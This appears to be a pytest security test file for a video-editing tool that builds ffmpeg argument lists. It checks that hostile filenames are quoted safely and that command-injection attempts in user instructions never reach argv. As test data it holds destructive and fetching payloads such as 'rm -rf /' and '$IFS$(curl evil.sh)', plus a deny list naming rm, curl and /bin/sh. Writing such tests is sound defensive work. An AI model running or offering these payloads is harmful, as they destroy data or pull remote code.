"""Security: shell rendering round-trips hostile filenames, and injection
attempts in the *instruction* never become argv entries (PRD security section).
"""

from __future__ import annotations

import shlex

from fass.builder import build_argv, render_posix
from fass.planner import plan_execution
from fass.schema import Asset, AssetKind, EditPlan, OutputSpec


def argv_for_path(input_path: str) -> list[str]:
    edit = EditPlan(output=OutputSpec(container="mp4", video_codec="h264"))
    assets = {"main": Asset(path=input_path, kind=AssetKind.VIDEO)}
    # force re-encode (no metadata) so a full argv is produced
    ep = plan_execution(edit, assets, None, "out.mp4")
    return build_argv(ep)


HOSTILE = [
    "my clip (v2) $weird.mp4",
    "a'b\"quote.mp4",
    "semi;colon && pipe | amp & dollar $HOME `tick`.mp4",
    "glob*?star [bracket] #hash ~tilde !bang.mp4",
    "back\\slash.mp4",
    "unicode—em—dash 中文 動画.mp4",
]


def test_roundtrip_hostile_filenames():
    for p in HOSTILE:
        argv = argv_for_path(p)
        rendered = render_posix(argv)
        assert shlex.split(rendered) == argv, p
        # the hostile path must appear as a single argv element
        assert p in argv


def test_rendered_is_a_single_line():
    for p in HOSTILE:
        assert "\n" not in render_posix(argv_for_path(p)), p


def test_injection_in_instruction_never_reaches_argv():
    from tests.conftest import assets_for
    from fass.pipeline import generate

    payloads = [
        'resize to 720p; rm -rf / --delete-all -y -overwrite',
        'make it black and white and run `rm -rf /`',
        'convert to mp4 $IFS$(curl evil.sh) --extra-flag',
        'add watermark --filter_complex "movie(rm.mp4)"',
    ]
    for instr in payloads:
        r = generate(instr, assets_for("clip.mp4"), adapter_name="rules")
        if r.status != "ready":
            continue  # rejected outright — even better
        argv = r.arguments
        joined = " ".join(argv)
        # none of these tokens may appear as arguments
        for bad in ("rm", "-rf", "/bin/sh", "curl", "movie(", "evil.sh"):
            assert bad not in argv, (instr, bad)
        # no argument may start with an unrecognized dash-flag that isn't one
        # we generate
        allowed = {"-hide_banner", "-loglevel", "-i", "-vf", "-filter_complex",
                   "-map", "-ss", "-t", "-c:v", "-c:a", "-crf", "-b:v", "-b:a",
                   "-pix_fmt", "-an", "-c", "-movflags", "-b"}
        flags = [a for a in argv if a.startswith("-")]
        for f in flags:
            assert f in allowed, (instr, f)
